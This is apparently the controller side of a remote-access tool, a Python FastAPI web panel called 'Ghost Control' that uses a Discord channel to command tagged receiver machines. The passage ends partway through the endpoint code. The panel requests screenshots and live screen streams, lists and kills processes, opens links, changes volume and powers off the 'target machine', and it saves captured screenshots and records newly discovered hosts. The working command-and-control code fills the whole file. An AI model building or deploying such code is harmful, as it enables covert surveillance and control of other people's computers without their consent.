# main.py
import asyncio
import importlib
import json
import os
import re
import subprocess
import sys
from pathlib import Path
from typing import Set, List, Dict, Optional


def ensure_dependencies():
    """
    Install required third-party packages before the rest of the app imports.
    """
    required = {
        "discord": "discord.py",
        "fastapi": "fastapi",
    }
    missing = []
    for module_name, package_name in required.items():
        try:
            importlib.import_module(module_name)
        except ImportError:
            missing.append(package_name)
    if not missing:
        return
    print(f"Installing missing packages: {', '.join(missing)}")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
    except Exception as exc:  # noqa: BLE001
        print(f"Failed to install required packages: {exc}")
        sys.exit(1)


ensure_dependencies()

import discord
from discord.ext import commands
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

# ====== CONFIG (use env vars) ======
CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "0"))
TARGET_CHANNEL_ID  = int(os.getenv("TARGET_CHANNEL_ID", "0"))
BOT_TAG = "[BOT1]"
TAG_BROADCAST_CHANNEL_ID = 1450113302104641618  # channel to post discovered tags

assert CONTROLLER_TOKEN, "Set CONTROLLER_TOKEN env var"
assert COMMAND_CHANNEL_ID and TARGET_CHANNEL_ID, "Set COMMAND/TARGET channel IDs"
# ===================================

KNOWN_TAGS: Set[str] = {BOT_TAG}
ACTIVE_BOT_TAG = BOT_TAG

# Storage for files (screenshots)
ROOT_DIR = Path(__file__).resolve().parent
DATA_DIR = Path("./data")
DATA_DIR.mkdir(exist_ok=True)

TAG_PATTERN = re.compile(r"^\s*(\[[^\]\r\n]{2,32}\])")
TAG_ANYWHERE = re.compile(r"(\[[^\[\]\r\n]{2,32}\])")
STREAM_URL_PATTERN = re.compile(r"(https?://[^\s>]+/stream)", re.IGNORECASE)

# Per-tag tracking of last known live stream URL
LAST_STREAMS: Dict[str, Dict[str, Optional[str]]] = {}

def _register_tag(tag: str) -> str:
    """
    Normalize and record a tag string.
    """
    tag_clean = tag.strip()
    if not tag_clean:
        return ACTIVE_BOT_TAG
    KNOWN_TAGS.add(tag_clean)
    print(f"[TAG] registered: {tag_clean}")
    return tag_clean


def _set_active_tag(tag: str) -> str:
    """
    Update the active tag used for outgoing commands.
    """
    global ACTIVE_BOT_TAG
    ACTIVE_BOT_TAG = _register_tag(tag)
    return ACTIVE_BOT_TAG


def _extract_tag(content: str):
    """
    Try to pull a leading [TAG] prefix from a receiver message.
    """
    if not content:
        return None
    match = TAG_PATTERN.match(content)
    if match:
        tag = match.group(1)
        print(f"[TAG] leading match: {tag} from {content}")
        return _register_tag(tag)
    match_any = TAG_ANYWHERE.search(content)
    if match_any:
        tag = match_any.group(1)
        print(f"[TAG] anywhere match: {tag} from {content}")
        return _register_tag(tag)
    return None


def _resolve_tag(tag: str = "") -> str:
    """
    Use the provided tag or fall back to the current active tag.
    """
    if tag and tag.strip():
        return _register_tag(tag)
    return ACTIVE_BOT_TAG


def _record_stream_url(tag: str, url: str, ts: Optional[str]) -> None:
    """
    Keep the most recent live stream URL per receiver tag.
    """
    if not tag or not url:
        return
    LAST_STREAMS[tag] = {"url": url, "ts": ts}


def play_tune(duration_sec: float = 5.0) -> None:
    """
    Play a short Jingle Bells motif (~5 seconds).
    """
    try:
        if os.name == "nt":
            import winsound

            # Jingle Bells: E E E | E E E | E G C D E
            seq = [
                (659, 300), (659, 300), (659, 600),  # E E E
                (0,   120),
                (659, 300), (659, 300), (659, 600),  # E E E
                (0,   120),
                (659, 300), (784, 300), (523, 300),  # E G C
                (587, 300), (659, 700),              # D E
            ]
            total = sum(t for _, t in seq)
            scale = duration_sec * 1000 / total if total else 1.0
            for freq, ms in seq:
                dur = max(60, int(ms * scale))
                if freq > 0:
                    winsound.Beep(int(freq), dur)
                else:
                    import time
                    time.sleep(dur / 1000)
        else:
            import time

            end = time.time() + duration_sec
            pattern = [0.1, 0.1, 0.2, 0.1, 0.1, 0.2, 0.1, 0.15, 0.1, 0.1, 0.2]
            idx = 0
            while time.time() < end:
                print("\a", end="", flush=True)
                time.sleep(pattern[idx % len(pattern)])
                idx += 1
    except Exception:
        print("\a", end="", flush=True)

# ---------- Discord controller bot ----------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="?", intents=intents)
_controller_ready = asyncio.Event()
_controller_error: Optional[str] = None

async def _get_channel(channel_id: int):
    ch = bot.get_channel(channel_id)
    if ch is None:
        ch = await bot.fetch_channel(channel_id)
    return ch


async def _wait_controller_ready(timeout: float = 8.0):
    """
    Wait for the Discord controller bot to be ready; fail fast if it never connects.
    """
    if _controller_error:
        raise HTTPException(status_code=503, detail=f"Discord bot failed to start: {_controller_error}")
    if _controller_ready.is_set():
        return
    try:
        await asyncio.wait_for(_controller_ready.wait(), timeout=timeout)
    except asyncio.TimeoutError:
        if _controller_error:
            raise HTTPException(status_code=503, detail=f"Discord bot failed to start: {_controller_error}")
        raise HTTPException(status_code=503, detail="Discord bot not connected yet.")
    if _controller_error:
        raise HTTPException(status_code=503, detail=f"Discord bot failed to start: {_controller_error}")

@bot.event
async def on_ready():
    print(f"Controller bot logged in as {bot.user}")
    play_tune()
    global _controller_error
    _controller_error = None
    _controller_ready.set()

# WebSocket broadcast hub
class Hub:
    def __init__(self):
        self.clients: Set[WebSocket] = set()
        self.lock = asyncio.Lock()

    async def connect(self, ws: WebSocket):
        await ws.accept()
        async with self.lock:
            self.clients.add(ws)

    async def disconnect(self, ws: WebSocket):
        async with self.lock:
            self.clients.discard(ws)

    async def broadcast(self, payload: dict):
        dead = []
        msg = json.dumps(payload)
        async with self.lock:
            for ws in list(self.clients):
                try:
                    await ws.send_text(msg)
                except Exception:
                    dead.append(ws)
            for ws in dead:
                self.clients.discard(ws)

hub = Hub()

# Listen for receiver outputs and push to UI
@bot.event
async def on_message(message: discord.Message):
    await bot.process_commands(message)
    if message.author.bot and message.channel.id == TARGET_CHANNEL_ID:
        tag = _extract_tag(message.content or "")
        print(f"[MSG] from {message.author} content={message.content!r} tag_detected={tag}")
        new_tag = False
        if tag:
            if tag not in KNOWN_TAGS:
                new_tag = True
            _register_tag(tag)
            if ACTIVE_BOT_TAG == BOT_TAG:
                _set_active_tag(tag)
        if new_tag:
            try:
                tag_ch = await _get_channel(TAG_BROADCAST_CHANNEL_ID)
                await tag_ch.send(f"Discovered receiver tag: {tag}")
            except Exception as exc:
                print(f"[TAG] failed to broadcast {tag}: {exc}")
        payload = {
            "type": "text",
            "author": str(message.author),
            "content": message.content,
            "attachments": [],
            "ts": message.created_at.isoformat(),
            "tag": tag,
        }
        try:
            match = STREAM_URL_PATTERN.search(message.content or "")
            if match and tag:
                stream_url = match.group(1)
                payload["stream_url"] = stream_url
                _record_stream_url(tag, stream_url, payload["ts"])
        except Exception:
            pass
        # Save any attachments (e.g., screenshot.png)
        for att in message.attachments:
            try:
                b = await att.read()
                fname = f"{att.id}_{att.filename}"
                fpath = DATA_DIR / fname
                with open(fpath, "wb") as f:
                    f.write(b)
                payload["attachments"].append({
                    "filename": att.filename,
                    "url": f"/files/{fname}"
                })
            except Exception as e:
                payload["attachments"].append({"filename": att.filename, "error": str(e)})
        await hub.broadcast(payload)

# ---------- FastAPI app ----------
app = FastAPI(title="Local Controller Panel")
app.mount("/files", StaticFiles(directory=str(DATA_DIR)), name="files")

# NEW: list files for screenshots tab persistence
@app.get("/files_index")
async def files_index(limit: int = 24):
    items: List[Dict[str, str]] = []
    for p in sorted(DATA_DIR.glob("*"), key=lambda x: x.stat().st_mtime, reverse=True)[:limit]:
        if p.is_file():
            items.append({
                "filename": p.name.split("_", 1)[-1],
                "url": f"/files/{p.name}",
                "mtime": p.stat().st_mtime
            })
    return {"files": items}

PANEL_HTML = r"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Ghost Control</title>
  <style>
    :root{
      --bg:#05060c; --panel:#0d111c; --card:#11192a; --line:#1c263a; --text:#e7edf8; --muted:#9aa6c2;
      --accent:#5fe0c5; --accent2:#4d82ff; --danger:#ff6b6b;
    }
    *{box-sizing:border-box;} body{margin:0; font:15px/1.55 "Inter","Segoe UI",Arial,sans-serif; background:radial-gradient(80% 60% at 10% 0%, rgba(93,175,255,.16), transparent), radial-gradient(65% 55% at 85% 0%, rgba(95,224,197,.12), transparent), var(--bg); color:var(--text);}
    a{color:inherit;}
    .page{max-width:1200px; margin:0 auto; padding:24px 16px 42px;}
    header.hero{display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; padding:16px 18px; border:1px solid var(--line); border-radius:14px; background:rgba(16,21,33,.85); backdrop-filter:blur(6px);}
    h1{margin:4px 0 0; font-size:24px;} .eyebrow{letter-spacing:0.28px; text-transform:uppercase; font-size:12px; color:var(--muted);}
    .status{display:flex; gap:8px; flex-wrap:wrap; align-items:center;} .pill{display:inline-flex; align-items:center; gap:8px; padding:7px 11px; border:1px solid var(--line); border-radius:10px; background:var(--card); font-weight:700;} .dot{width:10px; height:10px; border-radius:50%; background:#f5c04a;} .dot.ok{background:#5fe0c5;} .dot.bad{background:var(--danger);}
    .tag-control{display:grid; gap:6px; padding:8px 10px; border:1px solid var(--line); border-radius:10px; background:var(--card); min-width:240px;}
    .tag-row{display:flex; gap:6px; align-items:center; flex-wrap:wrap;} .tag-row input{flex:1; min-width:160px;}
    .tag-meta{font-size:12px; color:var(--muted);}
    .tag-box{border:1px solid var(--line); background:var(--card); padding:8px 10px; border-radius:10px; min-width:200px;}
    .tag-list{display:flex; flex-wrap:wrap; gap:6px; max-width:320px;}
    .tag-chip{border:1px solid var(--line); padding:5px 8px; border-radius:8px; background:#0c1220; cursor:pointer; font-weight:700;} .tag-chip:hover{border-color:var(--accent); color:var(--accent);}
    .shell{margin-top:16px; border:1px solid var(--line); border-radius:16px; background:var(--panel); box-shadow:0 20px 50px rgba(0,0,0,.35); overflow:hidden;}
    .tabbar{display:flex; gap:8px; padding:12px; border-bottom:1px solid var(--line); background:rgba(17,25,42,.75);}
    .tab-btn{flex:1; border:1px solid var(--line); background:var(--card); color:var(--text); padding:10px 12px; border-radius:10px; cursor:pointer; font-weight:700; letter-spacing:0.2px; transition:all .18s ease;} 
    .tab-btn.active{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border-color:transparent; transform:translateY(-1px); box-shadow:0 12px 30px rgba(79,136,255,.35);}
    .panel{padding:18px 18px 20px; min-height:480px; position:relative;}
    .view{position:absolute; inset:0; padding:18px; opacity:0; transform:translateY(10px); transition:opacity .22s ease, transform .22s ease; pointer-events:none;}
    .view.active{opacity:1; transform:translateY(0); pointer-events:auto;}
    .grid{display:grid; grid-template-columns:1.05fr .95fr; gap:14px;} @media(max-width:960px){.grid{grid-template-columns:1fr;}}
    .card{border:1px solid var(--line); border-radius:12px; background:var(--card); padding:14px;}
    .head{display:flex; justify-content:space-between; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:10px;} h3{margin:0;}
    .btn{border:1px solid var(--line); background:var(--card); color:var(--text); padding:9px 12px; border-radius:10px; font-weight:700; cursor:pointer; transition:transform .08s ease, filter .15s ease;} .btn:hover{filter:brightness(1.06); transform:translateY(-1px);} .btn.primary{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border:none;} .btn.danger{background:var(--danger); border-color:var(--danger); color:#061021;} .btn.small{padding:7px 10px; font-size:13px;}
    .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:220px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0a0f1a; color:var(--text);} label{font-weight:700;}
    .feed{display:flex; flex-direction:column; gap:10px; max-height:420px; overflow:auto; padding-right:4px;} .feed.small{max-height:360px;} .item{border:1px solid var(--line); border-radius:10px; padding:10px 12px; background:rgba(14,19,30,.9);} .meta{font-size:12px; color:var(--muted); margin-bottom:6px; word-break:break-word;}
    .gallery{display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:10px;} .shot{border:1px solid var(--line); border-radius:12px; overflow:hidden; background:#0b0f19; cursor:pointer;} .shot img{width:100%; display:block;}
    .live-wrap{display:flex; flex-direction:column; gap:12px; height:100%;}
    .live-meta{display:flex; flex-direction:column; gap:6px;}
    .live-frame{flex:1; border:1px solid var(--line); border-radius:12px; background:#05070d; display:flex; align-items:center; justify-content:center; overflow:hidden;}
    .live-frame img{width:100%; height:100%; object-fit:contain; background:#000;}
    #toast{position:fixed; left:50%; bottom:18px; transform:translateX(-50%); padding:9px 14px; border-radius:12px; border:1px solid var(--line); background:var(--panel); font-weight:700; opacity:0; transition:opacity .18s ease; z-index:120;}
  </style>
</head>
<body>
  <div class="page">
    <header class="hero">
      <div>
        <div class="eyebrow">Receiver console</div>
        <h1>Ghost Control</h1>
        <div class="muted">Minimal live control surface.</div>
      </div>
      <div class="status">
        <div class="pill"><span id="dot" class="dot"></span><span id="stxt">Connecting...</span></div>
        <div class="pill">Cmd {COMMAND_CHANNEL_ID}</div>
        <div class="tag-control">
          <div class="tag-meta">Target tag</div>
          <div class="tag-row">
            <input id="tagInput" list="tagOptions" placeholder="[HOST-XXXX]" value="{BOT_TAG}"/>
            <datalist id="tagOptions"></datalist>
            <button class="btn small" onclick="chooseTag()">Use</button>
            <button class="btn small" onclick="refreshTags()" title="Refresh known tags">&#8635;</button>
          </div>
          <div class="tag-meta">Active: <span id="tagActive">{BOT_TAG}</span></div>
        </div>
        <div class="tag-box">
          <div class="tag-meta">Seen tags (click to copy)</div>
          <div id="tagList" class="tag-list"></div>
        </div>
        <div class="pill" id="uptime">00:00</div>
      </div>
    </header>

    <div class="shell">
      <div class="tabbar">
        <button class="tab-btn active" data-tab="dash">Dashboard</button>
        <button class="tab-btn" data-tab="live">Live</button>
        <button class="tab-btn" data-tab="shots">Screenshots</button>
        <button class="tab-btn" data-tab="procs">Processes</button>
        <button class="tab-btn" data-tab="logs">Logs</button>
      </div>
      <div class="panel">
        <div id="tab-dash" class="view active">
          <div class="grid">
            <div class="card">
              <div class="head">
                <div><div class="eyebrow">Live</div><h3>Stream control</h3></div>
                <div class="row" style="gap:6px">
                  <input id="monitorIdx" style="max-width:80px" placeholder="1" value="1"/>
                  <button class="btn primary" onclick="startLive()">Start live</button>
                </div>
              </div>
              <div class="stack" style="margin-bottom:12px">
                <label for="streamUrl">Open existing stream URL</label>
                <div class="row">
                  <input id="streamUrl" placeholder="http://host:8081/stream"/>
                  <button class="btn" onclick="viewStream()">Open overlay</button>
                </div>
              </div>
              <div class="head" style="margin-top:6px">
                <div><div class="eyebrow">Quick actions</div><h3>Commands</h3></div>
              </div>
              <div class="stack">
                <div class="row">
                  <button class="btn" onclick="doShot()">Screenshot</button>
                  <button class="btn" onclick="doProcs()">Processes</button>
                  <button class="btn danger" onclick="confirmPower()">Power off</button>
                  <button class="btn primary" onclick="displayGif()">Display gif</button>
                </div>
                <div>
                  <label for="volPercent">Set volume (0-100)</label>
                  <div class="row">
                    <input id="volPercent" placeholder="100" value="100" style="max-width:120px"/>
                    <button class="btn" onclick="setVolume()">Set</button>
                  </div>
                </div>
                <div>
                  <label for="openUrl">Open link</label>
                  <div class="row">
                    <input id="openUrl" placeholder="https://example.com"/>
                    <button class="btn" onclick="openLink()">Open</button>
                  </div>
                </div>
                <div>
                  <label for="procName">Kill process</label>
                  <div class="row">
                    <input id="procName" placeholder="chrome.exe"/>
                    <button class="btn" onclick="killProc()">Kill</button>
                  </div>
                </div>
              </div>
            </div>
            <div class="card">
              <div class="head">
                <div><div class="eyebrow">Feed</div><h3>Live log</h3></div>
              </div>
              <div id="timeline" class="feed"></div>
            </div>
          </div>
        </div>

        <div id="tab-live" class="view" aria-hidden="true">
          <div class="card" style="height:100%; display:flex; flex-direction:column;">
            <div class="head">
              <div><div class="eyebrow">Live feed</div><h3>Receiver screen</h3></div>
              <div class="row" style="gap:6px;">
                <input id="liveManualUrl" placeholder="http://host:8081/stream" style="min-width:220px; flex:1;"/>
                <button class="btn small" onclick="loadManualStream()">View URL</button>
                <button class="btn primary small" onclick="startLiveAndWatch()">Start stream</button>
                <button class="btn small" onclick="stopLive()">Stop stream</button>
              </div>
            </div>
            <div class="live-wrap">
              <div class="live-meta">
                <div id="liveStatus" class="eyebrow">Waiting for stream...</div>
                <div id="liveUrlLabel" class="muted"></div>
                <div class="row" style="gap:6px;">
                  <button class="btn small" onclick="refreshLiveStatus()">Sync latest</button>
                  <button class="btn small" onclick="openLiveInNewTab()">Open in new tab</button>
                  <button class="btn small" onclick="startViewing()">Start viewing</button>
                  <button class="btn small" onclick="stopViewing()">Stop viewing</button>
                </div>
              </div>
              <div class="live-frame">
                <img id="liveFrame" alt="Live receiver view (MJPEG stream)" />
              </div>
            </div>
          </div>
        </div>

        <div id="tab-shots" class="view" aria-hidden="true">
          <div class="card" style="height:100%; display:flex; flex-direction:column;">
            <div class="head">
              <div><div class="eyebrow">Captures</div><h3>Screenshots</h3></div>
            </div>
            <div id="gallery" class="gallery"></div>
          </div>
        </div>

        <div id="tab-procs" class="view" aria-hidden="true">
          <div class="card" style="height:100%; display:flex; flex-direction:column;">
            <div class="head">
              <div><div class="eyebrow">Processes</div><h3>Process lists</h3></div>
              <button class="btn" onclick="doProcs()">Refresh</button>
            </div>
            <div id="procFeed" class="feed small"></div>
          </div>
        </div>

        <div id="tab-logs" class="view" aria-hidden="true">
          <div class="card" style="height:100%; display:flex; flex-direction:column;">
            <div class="head">
              <div><div class="eyebrow">History</div><h3>Logs</h3></div>
              <button class="btn" onclick="clearLogs()">Clear</button>
            </div>
            <div id="logFeed" class="feed small"></div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div id="toast"></div>

  <script>
    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList'), liveFrame:document.getElementById('liveFrame'), liveStatus:document.getElementById('liveStatus'), liveUrlLabel:document.getElementById('liveUrlLabel'), liveManualUrl:document.getElementById('liveManualUrl')};
    let currentTag = "{BOT_TAG}";
    let knownTags = new Set([currentTag]);
    let liveUrlByTag = {};
    let viewingEnabled = false;
    let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=`${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; },1000);

    function setStatus(ok){ el.dot.className='dot '+(ok?'ok':'bad'); el.stxt.textContent = ok ? 'Connected' : 'Reconnecting...'; }
    function toast(t){ const n=document.getElementById('toast'); n.textContent=t; n.style.opacity='1'; setTimeout(()=> n.style.opacity='0', 1500); }

    function copyTag(tag){ if(!tag) return; if(navigator.clipboard){ navigator.clipboard.writeText(tag).catch(()=>{}); toast('Copied '+tag); } else { prompt('Copy tag', tag); } }
    function renderTags(){
      if(el.tagActive) el.tagActive.textContent = currentTag || '(none)';
      const dl=document.getElementById('tagOptions');
      if(dl){
        dl.innerHTML='';
        Array.from(knownTags).sort().forEach(t=>{ const o=document.createElement('option'); o.value=t; dl.appendChild(o); });
      }
      if(el.tagInput && !el.tagInput.value) el.tagInput.value=currentTag;
      if(el.tagList){
        el.tagList.innerHTML='';
        Array.from(knownTags).sort().forEach(t=>{
          const chip=document.createElement('div');
          chip.className='tag-chip';
          chip.textContent=t;
          chip.onclick=()=>{ copyTag(t); if(el.tagInput) el.tagInput.value=t; };
          el.tagList.appendChild(chip);
        });
      }
    }
    async function refreshTags(){ try{ const r = await fetch('/tags'); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; } catch(e){} renderTags(); refreshLiveStatus(); }
    async function chooseTag(){ const val=(el.tagInput?.value||'').trim(); if(!val){ toast('Enter a tag'); return; } currentTag = val; try{ const r = await fetch('/tags/select?tag='+encodeURIComponent(val), {method:'POST'}); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; toast('Now targeting '+currentTag); } catch(e){ toast('Could not set tag'); } renderTags(); refreshLiveStatus(); }
    function withTag(path){ const u=new URL(path, window.location.origin); if(currentTag) u.searchParams.set('tag', currentTag); return u.pathname + u.search; }
    const tagRegex = /(^|\\s)(\\[[^\\[\\]\\r\\n]{2,32}\\])/;
    const streamRegex = /(https?:\\/\\/[^\\s>]+\\/stream)/i;
    function parseTag(text){ const m=(text||'').match(tagRegex); return m?m[2]:null; }
    function touchTagFromMessage(obj){
      const found = (obj&&obj.tag) || parseTag(obj&&obj.content);
      if(found){
        knownTags.add(found);
        const isDefault=currentTag==="{BOT_TAG}" || !currentTag || !knownTags.has(currentTag);
        if(isDefault) currentTag = found;
        renderTags();
      }
    }

    function applyLiveUrl(url, tag){
      if(!url || !tag) return;
      liveUrlByTag[tag] = url;
      if(tag !== currentTag || !viewingEnabled) return;
      if(el.liveFrame) el.liveFrame.src = url;
      if(el.liveStatus) el.liveStatus.textContent = 'Streaming ' + (tag || '');
      if(el.liveUrlLabel) el.liveUrlLabel.textContent = url;
      if(el.liveManualUrl && !el.liveManualUrl.value) el.liveManualUrl.value = url;
    }

    function openLiveInNewTab(){ const url=liveUrlByTag[currentTag]; if(url) window.open(url, '_blank'); else toast('No live URL yet for this tag'); }
    async function refreshLiveStatus(){ try{ const r = await fetch('/stream_status?tag='+encodeURIComponent(currentTag||'')); const j = await r.json(); if(j && j.url){ applyLiveUrl(j.url, currentTag); } else { toast('No live stream announced yet'); } } catch(e){ toast('Could not sync live feed'); } }
    function loadManualStream(){ const url=(el.liveManualUrl?.value||'').trim(); if(!url){ toast('Enter a stream URL'); return; } liveUrlByTag[currentTag]=url; if(viewingEnabled) applyLiveUrl(url, currentTag); toast('Live stream loaded'); }
    function startViewing(){ viewingEnabled = true; const url = liveUrlByTag[currentTag] || (el.liveManualUrl?.value||'').trim(); if(url){ applyLiveUrl(url, currentTag); } else { toast('No stream URL for this tag'); } }
    function stopViewing(){ viewingEnabled = false; if(el.liveFrame) el.liveFrame.src = ''; if(el.liveStatus) el.liveStatus.textContent = 'Viewing stopped'; }
    async function startLiveAndWatch(){ const ok = await startLive(); if(ok !== false) { viewingEnabled = true; setTab('live'); toast('Starting live feed'); } }
    function extractStream(obj){
      if(!obj) return null;
      if(obj.stream_url) return obj.stream_url;
      const found=(obj.content||'').match(streamRegex);
      return found ? found[1] : null;
    }

    function node(author, content, ts){ const d=document.createElement('div'); d.className='item'; const m=document.createElement('div'); m.className='meta'; const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString(); m.textContent = `${time} - ${author}`; const b=document.createElement('div'); b.textContent = content || ''; d.appendChild(m); d.appendChild(b); return d; }
    function addFeed(container, div, limit=200){ container.prepend(div); while(container.children.length>limit) container.lastChild.remove(); }
    function addShot(url){ if(!url) return; const wrap=document.createElement('div'); wrap.className='shot'; const img=document.createElement('img'); img.loading='lazy'; img.src=url; wrap.onclick=()=> window.open(url,'_blank'); wrap.appendChild(img); el.gallery.prepend(wrap); while(el.gallery.children.length>60) el.gallery.lastChild.remove(); }
    function addProc(text){ addFeed(el.procFeed, node('Processes', text, Date.now()), 120); }
    function addLog(div){ addFeed(el.logFeed, div, 300); }

    function setTab(id){
      ['dash','live','shots','procs','logs'].forEach(t=>{
        const view=document.getElementById(`tab-${t}`);
        const active=t===id;
        view.classList.toggle('active', active);
        view.setAttribute('aria-hidden', active?'false':'true');
      });
      document.querySelectorAll('.tab-btn').forEach(b=> b.classList.toggle('active', b.dataset.tab===id));
    }
    document.querySelectorAll('.tab-btn').forEach(btn=> btn.onclick = ()=> setTab(btn.dataset.tab));

    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; touchTagFromMessage(obj); const sUrl=extractStream(obj); if(sUrl && obj.tag) applyLiveUrl(sUrl, obj.tag); const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
    connectWS(); refreshTags(); refreshLiveStatus(); renderTags();

    async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
    async function startLive(){ const m=document.getElementById('monitorIdx').value.trim()||'1'; try{ await post('/cmd/live_start?monitor='+encodeURIComponent(m)); toast('Live stream starting'); return true; } catch(e){ toast(e.message||'Could not start live'); return false; } }
    async function stopLive(){ try{ await post('/cmd/live_stop'); toast('Stop live sent'); stopViewing(); } catch(e){ toast(e.message||'Could not stop live'); } }
    async function viewStream(){ const url=document.getElementById('streamUrl').value.trim(); if(!url){toast('Enter stream URL'); return;} try{ await post('/cmd/show_stream?url='+encodeURIComponent(url)); toast('Stream overlay sent'); } catch(e){ toast(e.message);} }
    async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
    async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
    async function openLink(){ const url=document.getElementById('openUrl').value.trim(); if(!url){toast('Enter a URL'); return;} const safe=(url.startsWith('http://')||url.startsWith('https://'))?url:'http://'+url; try{ await post('/cmd/open?url='+encodeURIComponent(safe)); toast('Open link sent'); } catch(e){ toast(e.message);} }
    async function killProc(){ const name=document.getElementById('procName').value.trim(); if(!name){toast('Enter a process name'); return;} try{ await post('/cmd/close?name='+encodeURIComponent(name)); toast('Kill command sent'); } catch(e){ toast(e.message);} }
    async function confirmPower(){ if(!confirm('Power off the target machine?')) return; try{ await post('/cmd/poweroff'); toast('Power off sent'); } catch(e){ toast(e.message);} }
    async function setVolume(){ const val=document.getElementById('volPercent').value.trim() || '100'; const num=parseFloat(val); if(Number.isNaN(num)){ toast('Enter a number'); return; } const pct=Math.min(100, Math.max(0, num)); try{ await post('/cmd/set_volume?pct='+encodeURIComponent(pct)); toast('Volume set to '+pct+'%'); } catch(e){ toast(e.message);} }
    async function displayGif(){ try{ await post('/cmd/display_gif'); toast('Display gif sent'); } catch(e){ toast(e.message);} }
    function clearLogs(){ el.logFeed.innerHTML=''; }

    fetch('/files_index').then(r=>r.json()).then(j=>{ (j.files||[]).forEach(f=> addShot(f.url)); }).catch(()=>{});
  </script>
</body>
</html>
""".replace("{COMMAND_CHANNEL_ID}", str(COMMAND_CHANNEL_ID)).replace("{BOT_TAG}", BOT_TAG)
 
@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse(PANEL_HTML)

@app.websocket("/ws")
async def ws_endpoint(ws: WebSocket):
    try:
        await hub.connect(ws)
        await ws.send_text(json.dumps({"type":"text","author":"Panel","content":"Connected to live stream.","attachments":[], "ts": ""}))
        while True:
            await ws.receive_text()
    except WebSocketDisconnect:
        await hub.disconnect(ws)
    except Exception:
        await hub.disconnect(ws)

# ---------- HTTP endpoints to send Discord commands ----------
async def _send_cmd(msg: str):
    await _wait_controller_ready()
    ch = await _get_channel(COMMAND_CHANNEL_ID)
    await ch.send(msg)

async def _send_cmd_with_file(msg: str, file_path: Path):
    """
    Send a command message and attach a file if provided.
    """
    await _wait_controller_ready()
    ch = await _get_channel(COMMAND_CHANNEL_ID)
    async with ch.typing():
        with open(file_path, "rb") as f:
            await ch.send(msg, file=discord.File(f, filename=file_path.name))

async def _send_cmd_with_files(msg: str, file_paths: List[Path]):
    """
    Send a command message with multiple file attachments.
    """
    await _wait_controller_ready()
    ch = await _get_channel(COMMAND_CHANNEL_ID)
    files = []
    handles = []
    try:
        for path in file_paths:
            handle = open(path, "rb")
            handles.append(handle)
            files.append(discord.File(handle, filename=path.name))
        async with ch.typing():
            await ch.send(msg, files=files)
    finally:
        for h in handles:
            try:
                h.close()
            except Exception:
                pass

@app.post("/cmd/ss")
async def cmd_ss(tag: str = Query(None)):
    await _send_cmd(f"{_resolve_tag(tag)} REQUEST_SCREENSHOT")
    return JSONResponse({"ok": True})

@app.post("/cmd/ps")
async def cmd_ps(tag: str = Query(None)):
    await _send_cmd(f"{_resolve_tag(tag)} LIST_PROCESSES")
    return JSONResponse({"ok": True})

@app.post("/cmd/open")
async def cmd_open(url: str = Query(..., min_length=1), tag: str = Query(None)):
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "http://" + url
    await _send_cmd(f"{_resolve_tag(tag)} OPEN_LINK {url}")
    return JSONResponse({"ok": True, "url": url})

@app.post("/cmd/close")
async def cmd_close(name: str = Query(..., min_length=1), tag: str = Query(None)):
    await _send_cmd(f"{_resolve_tag(tag)} KILL_PROCESS {name}")
    return JSONResponse({"ok": True, "name": name})

@app.post("/cmd/poweroff")
async def cmd_poweroff(tag: str = Query(None)):
    await _send_cmd(f"{_resolve_tag(tag)} POWER_OFF")
    return JSONResponse({"ok": True})

@app.post("/cmd/set_volume")
async def cmd_set_volume(pct: float = Query(100.0), tag: str = Query(None)):
    try:
        pct_val = max(0.0, min(100.0, float(pct)))
    except Exception:
        return JSONResponse({"ok": False, "error": "Invalid percent"}, status_code=400)
